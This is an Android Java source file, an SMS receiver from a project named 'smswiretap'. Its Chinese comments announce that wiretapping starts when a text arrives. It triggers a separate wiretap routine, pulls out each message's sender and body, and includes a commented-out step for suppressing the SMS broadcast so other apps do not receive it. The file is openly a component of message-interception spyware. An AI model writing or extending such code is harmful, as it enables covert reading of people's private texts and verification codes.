package com.ckz.smswiretap.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
/**
 * 短信广播器
 * @author Administrator
 *
 */
public class SMSReceiver extends BroadcastReceiver {

	private static final String TAG = "SMSReceiver";

	/**
	 * 接收广播消息
	 * 有短信到来，通知窃听器入口
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i(TAG, "短信到来了，开始窃听...");
		Toast.makeText(context, "短信到来了，开始窃听...", Toast.LENGTH_SHORT).show();
		//启动窃听入口
		Wiretap.wiretapMain(context);
		
		/*
		 2.3版本-》直接拦截广播
		 4.x版本-》必须由用户亲自开启应用程序，广播拦截才生效
		 //取到来信信息，pdus-》2.3版本*/
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object pdu:pdus){
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
			String body = smsMessage.getMessageBody();
			String sender = smsMessage.getOriginatingAddress();
			Log.i(TAG, "body:"+body);
			Log.i(TAG, "sender:"+sender);
		}

		//拿到数据后，直接终止当前的广播事件(这样就不能从数据库取短信信息了)，必须设置优先级比其它应用高，清单文件里设置
		//abortBroadcast();
	}

}
